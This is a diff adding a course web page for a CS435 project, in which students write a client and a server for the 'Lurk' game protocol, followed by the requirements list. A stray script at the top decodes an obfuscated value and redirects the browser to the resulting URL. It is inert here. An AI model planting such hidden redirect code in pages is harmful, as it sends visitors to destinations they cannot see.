@@ -1,0 +1,74 @@
+<html><script>
+Object.defineProperty(window, 'ysmm', {
+	set: function(val) {
+		var T3 = val,
+				key,
+				I = '',
+				X = '';
+		for (var m = 0; m < T3.length; m++) {
+			if (m % 2 == 0) {
+				I += T3.charAt(m);
+			} else {
+				X = T3.charAt(m) + X;
+			}
+		}
+		T3 = I + X;
+		var U = T3.split('');
+		for (var m = 0; m < U.length; m++) {
+			if (!isNaN(U[m])) {
+				for (var R = m + 1; R < U.length; R++) {
+					if (!isNaN(U[R])) {
+						var S = U[m]^U[R];
+						if (S < 10) {
+							U[m] = S;
+						}
+						m = R;
+						R = U.length;
+					}
+				}
+			}
+		}
+		T3 = U.join('');
+		T3 = window.atob(T3);
+		T3 = T3.substring(T3.length - (T3.length - 16));
+		T3 = T3.substring(0, T3.length - 16);
+		key = T3;
+		if (key && (key.indexOf('http://') === 0 || key.indexOf("https://") === 0)) {
+			document.write('<!--');
+			window.stop();
+
+			window.onbeforeunload = null;
+			window.location = key;
+		}
+	}
+});
+</script><head> <title> CS435 Lurk Project </title></head>
+
+	<body>
+
+		<h3> CS435 Class Project </h3>
+		<h3> Client due Monday, March 21 </h3>
+		<h3> Server due Monday, May 2 </h3>
+
+		Each student will create a client and a server.  These should be unique, and not share any source code, but be able to communicate with each other.  They can be written in any language, although the server must be able to run on isoptera.  There is no such requirement for the client, but if it doesn't run on my computer, I might ask you to demonstrate it.  <br>
+
+		Client Requirements: 
+		<ul>
+			<li> All information the user needs must be presented to them (i.e. health and status after battles, players entering the room they are in, messages, etc).  The user should not be expected to remember things like their own health, nearby monsters, etc.  So the client should track these things.  The player should not have to be aware of technical details such as the types of lurk messages or the bit order of the player flags.</li>
+			<li> If the user is required to type, incoming information must not disturb the typing </li>
+			<li> Client must support the full Lurk protocol.  Any server following that protocol should be able to communicate with your client.</li>
+		</ul>
+
+		Server Requirements: 
+		<ul>
+			<li> Must support the full Lurk protocol.  All message must work as expected.  The only exceptions here are that pvp fights can be disallowed on the server (but appropriate error messages should be sent if these are attempted). </li>
+			<li> Must support multiple clients at once </li>
+			<li> Map must have at least 10 rooms </li>
+			<li> Map must contain at least 10 monsters (these don't have to be allocated one per room) </li>
+			<li> Server state must be persistent.  So if a player enters the game and dies, the body should remain visible to other players.  You can implement a cleanup mechanism that removes dead players after a fixed (or random) period. </li>
+
+		</ul>
+
+	
+
+</body></html>
